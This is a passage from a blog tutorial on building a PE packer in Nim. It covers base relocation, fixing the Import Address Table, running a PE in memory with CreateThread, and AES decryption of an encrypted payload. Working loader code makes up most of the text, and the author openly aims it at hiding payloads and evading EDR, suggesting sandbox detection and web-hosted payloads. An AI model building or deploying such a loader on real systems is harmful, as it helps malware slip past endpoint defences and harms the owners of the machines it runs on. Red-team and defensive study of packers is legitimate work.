relocationsProcessed &lt; peHeaders.dataDirectory_relocation.size: <br />        echo <span class="hljs-string">&quot;\t[+] relocationsProcessed: &quot;</span>,relocationsProcessed,<span class="hljs-string">&quot; | dd_relocation.size: &quot;</span>,peHeaders.dataDirectory_relocation.<span class="hljs-function">size<br />        <span class="hljs-title">ReadProcessMemory</span>(<span class="hljs-params">GetCurrentProcess(</span>), relocationTable + relocationsProcessed, addr readProcessMemoryResult32, cast[SIZE_T](<span class="hljs-params"><span class="hljs-keyword">sizeof</span>(readProcessMemoryResult32</span>)),nil)<br />        <span class="hljs-keyword">var</span> relocBlockRVA</span> = readProcessMemoryResult32 <br />        <span class="hljs-keyword">var</span> pageAddress = (cast[<span class="hljs-built_in">int</span>](relocBlockRVA)) <br />        ReadProcessMemory(GetCurrentProcess(), relocationTable + relocationsProcessed+<span class="hljs-number">0x4</span>, addr readProcessMemoryResult32, cast[SIZE_T](<span class="hljs-keyword">sizeof</span>(readProcessMemoryResult32)),nil)<br />        relocationsProcessed += pbase_relocation_block<br /><br />        <span class="hljs-keyword">var</span> relocationsCount = <span class="hljs-built_in">int</span>((cast[<span class="hljs-built_in">int</span>](readProcessMemoryResult32) - pbase_relocation_block) / base_relocation_entry)<br />        <span class="hljs-keyword">var</span> i = <span class="hljs-number">0</span><br />        relocationsProcessed = relocationsProcessed - base_relocation_entry<br />        <span class="hljs-keyword">while</span> i &lt;= relocationsCount: <br />            <span class="hljs-meta"># Get relocation value</span><br />            relocationsProcessed += <span class="hljs-function">base_relocation_entry<br />            <span class="hljs-title">ReadProcessMemory</span>(<span class="hljs-params">GetCurrentProcess(</span>), relocationTable+relocationsProcessed, addr readProcessMemoryResult16, cast[SIZE_T](<span class="hljs-params"><span class="hljs-keyword">sizeof</span>(readProcessMemoryResult16</span>)),nil)<br />            <br />            <span class="hljs-keyword">if</span> <span class="hljs-title">toHex</span>(<span class="hljs-params">readProcessMemoryResult16</span>)[0]</span> == <span class="hljs-string">&#x27;0&#x27;</span>:<br />                relocationsProcessed += base_relocation_entry<br />                <span class="hljs-keyword">break</span><br /><br />            <span class="hljs-keyword">var</span> relocationEntryOffset = parseHexInt(toHex(readProcessMemoryResult16)[<span class="hljs-number">1.</span>.&lt;<span class="hljs-number">4</span>])<br />            <span class="hljs-keyword">var</span> relocationRVA = pageAddress + cast[<span class="hljs-built_in">int</span>](relocationEntryOffset) <br />            <span class="hljs-keyword">var</span> addressToPatch: ptr BYTE = <span class="hljs-function">nil<br />            <span class="hljs-title">ReadProcessMemory</span>(<span class="hljs-params">GetCurrentProcess(</span>),(<span class="hljs-params">pImageBase+relocationRVA</span>), addr addressToPatch,<span class="hljs-title">sizeof</span>(<span class="hljs-params">DWORD_PTR</span>),nil)</span>;<br />            addressToPatch += cast[ULONGLONG](deltaImageBase)<br />            copymem((pImageBase + relocationRVA), addr addressToPatch, <span class="hljs-keyword">sizeof</span>(DWORD_PTR));<br /><br />            inc(i)<br /><br />    echo <span class="hljs-string">&quot;[+] Base relocation parsing done&quot;</span></span></pre><h3 name="e57c" id="e57c" class="graf graf--h3 graf-after--pre">Fix Import Address Table (IAT)</h3><p name="26c3" id="26c3" class="graf graf--p graf-after--h3">Now we move on to the last big point, before moving on to getting that sweet sweet execution. We need to fix the Import Address Table of our binary. This is normally the job of the Windows LoadLibrary function and is done by Windows automatically. But since we are not executing the file like we normally would, we have to do this part ourselves. For this I just more or less stole everything from <a href="https://github.com/icyguider/Nimcrypt2/tree/main" data-href="https://github.com/icyguider/Nimcrypt2/tree/main" class="markup--anchor markup--p-anchor" rel="nofollow noopener" target="_blank">https://github.com/icyguider/Nimcrypt2/tree/main</a> and <a href="https://github.com/frank2/packer-tutorial" data-href="https://github.com/frank2/packer-tutorial" class="markup--anchor markup--p-anchor" rel="nofollow noopener" target="_blank">https://github.com/frank2/packer-tutorial</a> however ired also have a briliant guide <a href="https://www.ired.team/offensive-security/code-injection-process-injection/reflective-dll-injection" data-href="https://www.ired.team/offensive-security/code-injection-process-injection/reflective-dll-injection" class="markup--anchor markup--p-anchor" rel="nofollow noopener" target="_blank">https://www.ired.team/offensive-security/code-injection-process-injection/reflective-dll-injection</a>. Because of this i wont provide an example for this section. The general concept is, however:</p><pre data-code-block-mode="1" spellcheck="false" data-code-block-lang="vbnet" name="8d3f" id="8d3f" class="graf graf--pre graf-after--p graf--preV2"><span class="pre--content"><span class="hljs-keyword">Loop</span> through import descriptors<br />  <span class="hljs-keyword">call</span> LoadLibrary <span class="hljs-keyword">with</span> <span class="hljs-keyword">lib</span> name<br />  <span class="hljs-keyword">loop</span> through thunks (thunk = either OriginalFirstThunk: RVA <span class="hljs-keyword">of</span> the ILT.<span class="hljs-built_in">or</span> FirstThunk: RVA <span class="hljs-keyword">of</span> the IAT.)<br />    check <span class="hljs-keyword">if</span> loaded <span class="hljs-keyword">by</span> ordinal <span class="hljs-built_in">and</span> update <span class="hljs-keyword">with</span> <span class="hljs-keyword">lib</span> address <span class="hljs-keyword">from</span> GerProcAddress<br />  </span></pre><p name="d0d4" id="d0d4" class="graf graf--p graf-after--pre">For more info on the IAT and thunks see <a href="https://0xrick.github.io/win-internals/pe6/" data-href="https://0xrick.github.io/win-internals/pe6/" class="markup--anchor markup--p-anchor" rel="nofollow noopener" target="_blank">https://0xrick.github.io/win-internals/pe6/</a>.</p><p name="b25e" id="b25e" class="graf graf--p graf-after--p">My variation ended up looking something like this:</p><pre data-code-block-mode="1" spellcheck="false" data-code-block-lang="cpp" name="278c" id="278c" class="graf graf--pre graf-after--p graf--preV2"><span class="pre--content"><span class="hljs-function">proc <span class="hljs-title">OriginalFirstThunk</span><span class="hljs-params">(self: ptr IMAGE_IMPORT_DESCRIPTOR)</span>: DWORD {</span>.<span class="hljs-keyword">inline</span>.} = self.union1.OriginalFirstThunk<br />proc fixImportAddressTable*(peHeaders: PeHEaders, modulePtr: PVOID, exeArgs: Stringable): <span class="hljs-type">bool</span> =<br />    echo <span class="hljs-string">&quot;[+] Fix Import Address Table&quot;</span><br />    var maxSize: <span class="hljs-type">csize_t</span> = cast[<span class="hljs-type">csize_t</span>](peHeaders.dataDirectory_import.size)<br />    var impAddr: <span class="hljs-type">csize_t</span> = cast[<span class="hljs-type">csize_t</span>](peHeaders.dataDirectory_import.rva)<br />    var lib_desc: ptr IMAGE_IMPORT_DESCRIPTOR<br />    var parsedSize: <span class="hljs-type">csize_t</span> = <span class="hljs-number">0</span><br />    <span class="hljs-keyword">while</span> parsedSize &lt; maxSize:<br />        lib_desc = cast[ptr IMAGE_IMPORT_DESCRIPTOR]((<br />            impAddr + parsedSize + cast[uint64](modulePtr)))<br />        <br />        <span class="hljs-keyword">if</span> (lib_desc.OriginalFirstThunk == <span class="hljs-number">0</span>) <span class="hljs-built_in">and</span> (lib_desc.FirstThunk == <span class="hljs-number">0</span>):<br />            <span class="hljs-keyword">break</span><br />        var libname: LPSTR = cast[LPSTR](cast[ULONGLONG](modulePtr) + lib_desc.Name)<br />        echo <span class="hljs-string">&quot;\t[+] Import DLL: &quot;</span>, $libname<br />        var call_via: <span class="hljs-type">csize_t</span> = cast[<span class="hljs-type">csize_t</span>](lib_desc.FirstThunk)<br />        var thunk_addr: <span class="hljs-type">csize_t</span> = cast[<span class="hljs-type">csize_t</span>](lib_desc.OriginalFirstThunk)<br />        <span class="hljs-keyword">if</span> thunk_addr == <span class="hljs-number">0</span>:<br />            thunk_addr = <span class="hljs-built_in">csize_t</span>(lib_desc.FirstThunk)<br />        var offsetField: <span class="hljs-type">csize_t</span> = <span class="hljs-number">0</span><br />        var offsetThunk: <span class="hljs-type">csize_t</span> = <span class="hljs-number">0</span><br />        var hmodule: HMODULE = <span class="hljs-built_in">LoadLibraryA</span>(libname)<br />         <br />        <span class="hljs-keyword">while</span> <span class="hljs-literal">true</span>:<br />            <span class="hljs-meta"># something fucks up here for x32 binaries</span><br />            var fieldThunk: PIMAGE_THUNK_DATA = cast[PIMAGE_THUNK_DATA]((<br />                cast[<span class="hljs-type">csize_t</span>](modulePtr) + offsetField + call_via))<br />            var orginThunk: PIMAGE_THUNK_DATA = cast[PIMAGE_THUNK_DATA]((<br />                cast[<span class="hljs-type">csize_t</span>](modulePtr) + offsetThunk + thunk_addr))<br />            var boolvar: <span class="hljs-type">bool</span><br />            <span class="hljs-keyword">if</span> ((orginThunk.u1.Ordinal <span class="hljs-keyword">and</span> IMAGE_ORDINAL_FLAG32) != <span class="hljs-number">0</span>):<br />                boolvar = <span class="hljs-literal">true</span><br />            <span class="hljs-built_in">elif</span>((orginThunk.u1.Ordinal <span class="hljs-keyword">and</span> IMAGE_ORDINAL_FLAG64) != <span class="hljs-number">0</span>):<br />                boolvar = <span class="hljs-literal">true</span><br /><br />            <span class="hljs-keyword">if</span> (boolvar):<br />                var libaddr: <span class="hljs-type">size_t</span> = cast[<span class="hljs-type">size_t</span>](<span class="hljs-built_in">GetProcAddress</span>(<span class="hljs-built_in">LoadLibraryA</span>(libname),cast[LPSTR]((orginThunk.u1.Ordinal <span class="hljs-keyword">and</span> <span class="hljs-number">0xFFFF</span>))))<br />                fieldThunk.u1.Function = <span class="hljs-built_in">ULONGLONG</span>(libaddr)<br /><br />            <span class="hljs-keyword">if</span> fieldThunk.u1.Function == <span class="hljs-number">0</span>:<br />                <span class="hljs-keyword">break</span><br />            <span class="hljs-keyword">if</span> fieldThunk.u1.Function == orginThunk.u1.Function:<br />                var nameData: PIMAGE_IMPORT_BY_NAME = cast[PIMAGE_IMPORT_BY_NAME](orginThunk.u1.AddressOfData)<br />                var byname: PIMAGE_IMPORT_BY_NAME = cast[PIMAGE_IMPORT_BY_NAME](cast[ULONGLONG](modulePtr) + cast[DWORD](nameData))<br />                var func_name: LPCSTR = cast[LPCSTR](addr byname.Name)<br />                var libaddr: <span class="hljs-type">csize_t</span> = cast[<span class="hljs-type">csize_t</span>](<span class="hljs-built_in">GetProcAddress</span>(hmodule,func_name))     <br />                fieldThunk.u1.Function = <span class="hljs-built_in">ULONGLONG</span>(libaddr)<br /><br />            <span class="hljs-built_in">inc</span>(offsetField, <span class="hljs-built_in">sizeof</span>((IMAGE_THUNK_DATA)))<br />            <span class="hljs-built_in">inc</span>(offsetThunk, <span class="hljs-built_in">sizeof</span>((IMAGE_THUNK_DATA)))<br />        <span class="hljs-built_in">inc</span>(parsedSize, <span class="hljs-built_in">sizeof</span>((IMAGE_IMPORT_DESCRIPTOR)))<br />    <span class="hljs-keyword">return</span> <span class="hljs-literal">true</span></span></pre><p name="0a91" id="0a91" class="graf graf--p graf-after--pre">After this the binary will be: loaded in memory, base relocations have been updated, and IAT is updated. Now the only thing left will be to transfer execution.</p><p name="44d3" id="44d3" class="graf graf--p graf-after--p">Short side note, for command line args (which can be nice to have) you will either need to patch the GetCommandLineA and GetCommandLineW functions like is done in the preferred examples, or do as I did and directly patch the PEB data in memory. This is also why the example above is different from the references. If you only need a basic packer and know what you will execute then this step can be skipped in favor of just hardcoding everything in the application to be packed and injected. This is not a good or robust solution but if you need results ASAP then it might be a viable option.</p><h3 name="ab50" id="ab50" class="graf graf--h3 graf-after--p">Transfer execution</h3><p name="46dd" id="46dd" class="graf graf--p graf-after--h3">We are almost there and now we just need the last step! let the last step is simply transfer execution to our program in memory!</p><p name="d124" id="d124" class="graf graf--p graf-after--p">I like to do it using simple CreateThread, but there are plenty of ways to do it!</p><pre data-code-block-mode="1" spellcheck="false" data-code-block-lang="go" name="74e5" id="74e5" class="graf graf--pre graf-after--p graf--preV2"><span class="pre--content">proc transferExecution(peHeaders: PeHEaders, pImageBase: ptr BYTE) =<br />    echo <span class="hljs-string">&quot;[+] Executing PE in memory&quot;</span><br />    <span class="hljs-keyword">var</span> thread = CreateThread(<span class="hljs-literal">nil</span>, cast[SIZE_T](<span class="hljs-number">0</span>), cast[LPTHREAD_START_ROUTINE](peHeaders.optionalHeader.addressOfEntryPoint + cast[ULONGLONG](pImageBase)), <span class="hljs-literal">nil</span>, <span class="hljs-number">0</span>, <span class="hljs-literal">nil</span>)<br />    WaitForSingleObject(thread, cast[DWORD](<span class="hljs-number">0xFFFFFFFFF</span>))</span></pre><figure name="04cf" id="04cf" class="graf graf--figure graf-after--pre"><img class="graf-image" data-image-id="1*mf_Ja3a9d4oll7VRF4wajw.png" data-width="1386" data-height="885" src="https://cdn-images-1.medium.com/max/800/1*mf_Ja3a9d4oll7VRF4wajw.png"><figcaption class="imageCaption">And we have execution from binary in memory</figcaption></figure><h3 name="3a0f" id="3a0f" class="graf graf--h3 graf-after--figure">Debugging</h3><p name="fec9" id="fec9" class="graf graf--p graf-after--h3">Generally for debugging, unless it&#39;s just regular programming errors like misspellings etc. I like to use x96dbg.exe for debugging the application, this is very useful to check if we are reading from the correct location or if data is written correctly. The easiest way I found of doing this is using the .repr command to get the address of the data I want to look at, along with readLine() to stop execution, the debugger can then be brought up and used to inspect a place in memory.</p><pre data-code-block-mode="1" spellcheck="false" data-code-block-lang="php" name="1d3b" id="1d3b" class="graf graf--pre graf-after--p graf--preV2"><span class="pre--content"><span class="hljs-keyword">echo</span> variable.repr<br /><span class="hljs-keyword">var</span> consoleInput = <span class="hljs-title function_ invoke__">readLine</span>(stdin)</span></pre><figure name="dad6" id="dad6" class="graf graf--figure graf-after--pre"><img class="graf-image" data-image-id="1*tlH6IliyuAu29792MZ-dkg.png" data-width="1672" data-height="890" data-is-featured="true" src="https://cdn-images-1.medium.com/max/800/1*tlH6IliyuAu29792MZ-dkg.png"><figcaption class="imageCaption">example of using CFF Explorer, x64dbg and printing addresses to check our work</figcaption></figure><p name="206d" id="206d" class="graf graf--p graf-after--figure">in the above example we are mapping the .text section of our binary to memory and checking the result in the debugger.</p><p name="c7a7" id="c7a7" class="graf graf--p graf-after--p">Also, if you have issues with types in vim the <em class="markup--em markup--p-em">typeinfo </em>library is worth its weight in gold!</p><p name="b9a2" id="b9a2" class="graf graf--p graf-after--p">Lastly looking at other implementations like the ones linked at the start or below is great for debugging and gaining further understanding of how things are supposed to work. For example, when I created my first packer I could not understand why I had issues running go binaries, and after much confusion, I saw in other implementations that they did not do base relocation if the binary was at the preferred location in memory. Some debugging and patching later I got this implemented and all of a sudden everything was working as expected!</p><ul class="postList"><li name="01a1" id="01a1" class="graf graf--li graf-after--p"><a href="https://github.com/nettitude/RunPE" data-href="https://github.com/nettitude/RunPE" class="markup--anchor markup--li-anchor" rel="nofollow noopener" target="_blank">https://github.com/nettitude/RunPE</a></li><li name="0475" id="0475" class="graf graf--li graf-after--li"><a href="https://github.com/Zer0Mem0ry/RunPE" data-href="https://github.com/Zer0Mem0ry/RunPE" class="markup--anchor markup--li-anchor" rel="nofollow noopener" target="_blank">https://github.com/Zer0Mem0ry/RunPE</a></li><li name="a1b8" id="a1b8" class="graf graf--li graf-after--li"><a href="https://github.com/aaaddress1/RunPE-In-Memory" data-href="https://github.com/aaaddress1/RunPE-In-Memory" class="markup--anchor markup--li-anchor" rel="nofollow noopener" target="_blank">https://github.com/aaaddress1/RunPE-In-Memory</a></li><li name="1d3d" id="1d3d" class="graf graf--li graf-after--li"><a href="https://github.com/SzymoRatajczak/RunPE" data-href="https://github.com/SzymoRatajczak/RunPE" class="markup--anchor markup--li-anchor" rel="nofollow noopener" target="_blank">https://github.com/SzymoRatajczak/RunPE</a></li></ul><h3 name="7cac" id="7cac" class="graf graf--h3 graf-after--li">Adding encryption and decryption</h3><p name="1a5d" id="1a5d" class="graf graf--p graf-after--h3">Now you are probably asking yourself: well this is all cool and good, but we still have our file unencrypted on disk and are loading it from an unobfuscated file, we can&#39;t use this for anything!</p><p name="7834" id="7834" class="graf graf--p graf-after--p">Well, I got good news for you! Since we did all of the loading of the file to memory using nim Streams that means that this could either be a plain unencrypted file, an encrypted blob, or a file hosted on a web server!</p><p name="b679" id="b679" class="graf graf--p graf-after--p">for encryption and decryption, I can&#39;t do better than byt3bl33d3r’s offensive nim, so I&#39;m just gonna paste a link here, you can more or less just copy and paste the code into the project!</p><div name="e2a7" id="e2a7" class="graf graf--mixtapeEmbed graf-after--p"><a href="https://github.com/byt3bl33d3r/OffensiveNim/blob/master/src/encrypt_decrypt_bin.nim" data-href="https://github.com/byt3bl33d3r/OffensiveNim/blob/master/src/encrypt_decrypt_bin.nim" class="markup--anchor markup--mixtapeEmbed-anchor" title="https://github.com/byt3bl33d3r/OffensiveNim/blob/master/src/encrypt_decrypt_bin.nim"><strong class="markup--strong markup--mixtapeEmbed-strong">OffensiveNim/src/encrypt_decrypt_bin.nim at master · byt3bl33d3r/OffensiveNim</strong><br><em class="markup--em markup--mixtapeEmbed-em">My experiments in weaponizing Nim (https://nim-lang.org/) - OffensiveNim/src/encrypt_decrypt_bin.nim at master ·…</em>github.com</a><a href="https://github.com/byt3bl33d3r/OffensiveNim/blob/master/src/encrypt_decrypt_bin.nim" class="js-mixtapeImage mixtapeImage u-ignoreBlock" data-media-id="d41f8dd709c8168ea813b57d1d5d5948" data-thumbnail-img-id="0*8qU11UiUiGg4xsaD" style="background-image: url(https://cdn-images-1.medium.com/fit/c/160/160/0*8qU11UiUiGg4xsaD);"></a></div><p name="188b" id="188b" class="graf graf--p graf-after--mixtapeEmbed">Below is an example of how this might look:</p><pre data-code-block-mode="1" spellcheck="false" data-code-block-lang="php" name="17af" id="17af" class="graf graf--pre graf-after--p graf--preV2"><span class="pre--content"><span class="hljs-comment"># General AES variables</span><br /><span class="hljs-keyword">var</span><br />    ectx: CTR[aes256]<br />    key: <span class="hljs-keyword">array</span>[aes256.sizeKey, byte]<br />    iv: <span class="hljs-keyword">array</span>[aes256.sizeBlock, byte] = [byte <span class="hljs-number">0xA</span>, <span class="hljs-number">0xA</span>, <span class="hljs-number">0xA</span>, <span class="hljs-number">0xA</span>, <span class="hljs-number">0xA</span>, <span class="hljs-number">0xA</span>, <span class="hljs-number">0xB</span>, <span class="hljs-number">0xE</span>, <span class="hljs-number">0xA</span>, <span class="hljs-number">0xA</span>, <span class="hljs-number">0xF</span>, <span class="hljs-number">0xA</span>, <span class="hljs-number">0xB</span>, <span class="hljs-number">0xA</span>, <span class="hljs-number">0xA</span>, <span class="hljs-number">0xA</span>]<br /><br /><span class="hljs-keyword">var</span> envkey: <span class="hljs-keyword">string</span> = <span class="hljs-string">&quot;MyMalwareBringsAllTheBoysToTheYard&quot;</span><br /><br />proc decryptFileToMemory*(inFile: <span class="hljs-keyword">string</span>):seq[byte] =<br />    <span class="hljs-keyword">echo</span> <span class="hljs-string">&quot;[+] Decrypting file&quot;</span><br />    <span class="hljs-keyword">echo</span> <span class="hljs-string">&quot;\t[+] Reading encrypted file&quot;</span><br />    <span class="hljs-keyword">var</span> enc_blob: Stream<br />    enc_blob = <span class="hljs-title function_ invoke__">newFileStream</span>(inFile, fmRead)<br /><br />    <span class="hljs-comment"># Expand key to 32 bytes using SHA256 as the KDF</span><br />    <span class="hljs-keyword">echo</span> <span class="hljs-string">&quot;\t[+] Expanding key&quot;</span><br />    <span class="hljs-keyword">var</span> expandedkey = sha256.<span class="hljs-title function_ invoke__">digest</span>(envkey)<br />    <span class="hljs-title function_ invoke__">copyMem</span>(addr key[<span class="hljs-number">0</span>], addr expandedkey.data[<span class="hljs-number">0</span>], <span class="hljs-title function_ invoke__">len</span>(expandedkey.data))<br />    <span class="hljs-keyword">echo</span> <span class="hljs-string">&quot;\t[+] Decoding&quot;</span><br />    <span class="hljs-keyword">var</span> dectext = newSeq[byte](<span class="hljs-title function_ invoke__">len</span>(enc_blob.<span class="hljs-title function_ invoke__">readAll</span>()))<br /><br />    enc_blob.<span class="hljs-title function_ invoke__">setPosition</span>(<span class="hljs-number">0</span>)<br />    <span class="hljs-keyword">echo</span> <span class="hljs-string">&quot;\t[+] Decrypting&quot;</span><br />    <span class="hljs-keyword">var</span> str: <span class="hljs-keyword">string</span> = <span class="hljs-title function_ invoke__">decode</span>(enc_blob.<span class="hljs-title function_ invoke__">readAll</span>())<br />    ectx.<span class="hljs-title function_ invoke__">init</span>(key, iv)<br />    ectx.<span class="hljs-title function_ invoke__">decrypt</span>(<span class="hljs-title function_ invoke__">toByteSeq</span>(str), dectext)<br />    ectx.<span class="hljs-title function_ invoke__">clear</span>()<br />    <span class="hljs-keyword">echo</span> <span class="hljs-string">&quot;\t[+] File decrypted and loadded into memory&quot;</span><br />    <span class="hljs-keyword">return</span> dectext</span></pre><h3 name="529f" id="529f" class="graf graf--h3 graf-after--pre">Conclusion</h3><p name="b680" id="b680" class="graf graf--p graf-after--h3">So now we are at the end, and you are most likely wondering: wait but you did not give me a complete project i can ctrl+c + ctrl+v into visual studio code and execute WFT?!?! well, that is on purpose, in the text above you will have the foundations to create your own packer in any way you see fit. And if you do it this way instead of just stealing from GitHub, there might actually be a chance that you can get it running and evade EDR ;)</p><p name="a9e0" id="a9e0" class="graf graf--p graf-after--p">For a general framework of how to put the things above either refer to nimcrypt2 or below if loading from disk:</p><pre data-code-block-mode="1" spellcheck="false" data-code-block-lang="scss" name="407e" id="407e" class="graf graf--pre graf-after--p graf--preV2"><span class="pre--content"><span class="hljs-built_in">loadPeToMemory</span>(&quot;C:\filepath\payload.exe)<br />*decryptFunction*()<br /><span class="hljs-built_in">parsePeHeaders</span>(loadededPeFile)<br /><span class="hljs-built_in">validatePeFile</span>(peHeaders)<br /><span class="hljs-built_in">parseSectionHeaders</span>(loadededPeFile)<br /><span class="hljs-built_in">mapPeToMemory</span>(peHeaders, loadededPeFile, sectionHeaders)<br /><span class="hljs-built_in">checkPreferedAddress</span>(pImageBase, peHeaders)<br /><span class="hljs-built_in">fixImportAddressTable</span>(peHeaders, pImageBase, argsString)<br /><span class="hljs-built_in">transferExecution</span>(peHeaders, pImageBase)</span></pre><p name="5170" id="5170" class="graf graf--p graf-after--pre">Additional work to be done includes adding sandbox detection and EDR evasion but as previously mentioned, these have plenty of resources available online. just remember to do this before running the Packer part ;)</p><p name="72d6" id="72d6" class="graf graf--p graf-after--p graf--trailing">I hope that this was somewhat entertaining or useful and if you learned anything — even better!</p></div></div></section>
</section>
<footer><p>By <a href="https://medium.com/@0x0vid" class="p-author h-card">0x0vid</a> on <a href="https://medium.com/p/460b5b3692e0"><time class="dt-published" datetime="2023-12-02T14:21:41.921Z">December 2, 2023</time></a>.</p><p><a href="https://medium.com/@0x0vid/writing-a-packer-from-scratch-in-nim-460b5b3692e0" class="p-canonical">Canonical link</a></p><p>Exported from <a href="https://medium.com">Medium</a> on March 28, 2024.</p></footer></article></body></html>